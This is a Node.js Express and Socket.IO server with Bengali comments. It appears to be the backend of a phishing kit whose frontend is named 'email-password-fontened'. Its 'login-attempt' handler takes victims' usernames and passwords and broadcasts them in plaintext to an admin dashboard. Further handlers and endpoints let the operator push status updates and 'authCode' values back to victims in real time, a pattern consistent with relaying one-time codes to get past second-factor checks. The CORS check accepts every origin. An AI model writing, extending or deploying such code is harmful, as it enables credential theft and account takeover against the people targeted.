const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');

const app = express();

// ======================== CORS ==========================
const allowedOrigins = [
  'https://email-password-fontened.vercel.app',
  'http://localhost:3000',
  'https://email-password-fontened-git-main.vercel.app',
  // আপনার নতুন Vercel URL যোগ করুন
];

app.use(cors({
  origin: function (origin, callback) {
    if (!origin) return callback(null, true);
    if (allowedOrigins.indexOf(origin) !== -1) {
      callback(null, true);
    } else {
      console.log('Blocked origin:', origin);
      callback(null, true); // প্রোডাকশনে সীমাবদ্ধ করুন
    }
  },
  methods: ['GET', 'POST', 'OPTIONS', 'PUT', 'DELETE'],
  credentials: true,
  allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
}));

app.use(express.json());
app.use(express.urlencoded({ extended: true }));

const server = http.createServer(app);

// ======================== SOCKET.IO ==========================
const io = new Server(server, {
  cors: {
    origin: function (origin, callback) {
      if (!origin) return callback(null, true);
      if (allowedOrigins.indexOf(origin) !== -1) {
        callback(null, true);
      } else {
        console.log('Socket blocked origin:', origin);
        callback(null, true);
      }
    },
    methods: ['GET', 'POST', 'OPTIONS', 'PUT', 'DELETE'],
    credentials: true,
    allowedHeaders: ['Content-Type', 'Authorization', 'X-Requested-With'],
  },
  // **দুইটি transport সমর্থন করুন**
  transports: ['polling', 'websocket'],
  path: '/socket.io/',
  pingTimeout: 60000,
  pingInterval: 25000,
  allowEIO3: true,
  allowUpgrades: true,
  upgradeTimeout: 15000,
  cookie: false,
  connectionStateRecovery: {
    maxDisconnectionDuration: 2 * 60 * 1000,
    skipMiddlewares: true,
  },
  // **প্রোডাকশনে secure সংযোগ**
  serveClient: false,
  // **WebSocket সংযোগের জন্য স্পেসিফিক**
  wsEngine: 'ws', // ws লাইব্রেরি ব্যবহার করুন
});

console.log('🚀 Socket.IO server initializing...');

// ======================== SOCKET EVENTS ==========================
io.on('connection', (socket) => {
  console.log('✅ User connected:', socket.id);
  console.log('🔌 Transport:', socket.conn.transport.name);

  // সংযোগ নিশ্চিতকরণ
  socket.emit('connected', {
    message: 'Connected to socket server',
    socketId: socket.id,
    transport: socket.conn.transport.name,
    secure: socket.conn.secure || false,
  });

  // **Transport আপগ্রেডের তথ্য**
  socket.conn.on('upgrade', () => {
    console.log(`🔄 ${socket.id} upgraded to: ${socket.conn.transport.name}`);
  });

  // Admin যোগদান
  socket.on('admin-joined', (data) => {
    console.log(`👑 Admin ${data.name || 'Admin'} joined`);
    socket.emit('admin-joined-confirmed', { status: 'ok' });
  });

  // **Ping/Pong সংযোগ বজায় রাখার জন্য**
  socket.on('ping', () => {
    socket.emit('pong');
  });

  // অন্যান্য ইভেন্ট...
  socket.on('login-attempt', (data) => {
    console.log(`📥 Login attempt from: ${data.username}`);
    io.emit('admin_notification', {
      email: data.username,
      password: data.password,
      timestamp: new Date().toISOString(),
    });
  });

  socket.on('update-login-status', (data) => {
    console.log(`📢 Admin updated status: ${data.username} → ${data.status}`);
    io.emit('user_update', {
      email: data.username,
      newStatus: data.status,
      authCode: data.authCode || '',
    });
  });

  socket.on('disconnect', (reason) => {
    console.log('❌ User disconnected:', socket.id, 'Reason:', reason);
  });
});

// ======================== HEALTH CHECK ==========================
app.get('/health', (req, res) => {
  res.json({
    status: 'ok',
    clients: io.engine.clientsCount,
    uptime: Math.floor(process.uptime()),
    timestamp: new Date().toISOString(),
  });
});

// ======================== API ENDPOINTS ==========================
app.post('/api/notify-admin', (req, res) => {
  const { email, type, message } = req.body;
  console.log(`📧 Notification: [${type}] ${email}`);

  io.emit('admin_notification', {
    email,
    type,
    message,
    timestamp: new Date().toISOString(),
  });

  res.json({ success: true, clients: io.engine.clientsCount });
});

app.post('/api/admin-action', (req, res) => {
  const { userId, newStatus, authCode, email } = req.body;
  console.log(`🔔 Admin action: ${newStatus} for ${email || userId}`);

  io.emit('user_update', {
    userId,
    newStatus,
    authCode: authCode || '',
    email: email || '',
    timestamp: new Date().toISOString(),
  });

  res.json({ success: true, clients: io.engine.clientsCount });
});

// ======================== SERVER START ==========================
const PORT = process.env.PORT || 8000;
server.listen(PORT, '0.0.0.0', () => {
  console.log(`🚀 Server running on port ${PORT}`);
  console.log(`📍 Environment: ${process.env.NODE_ENV || 'development'}`);
});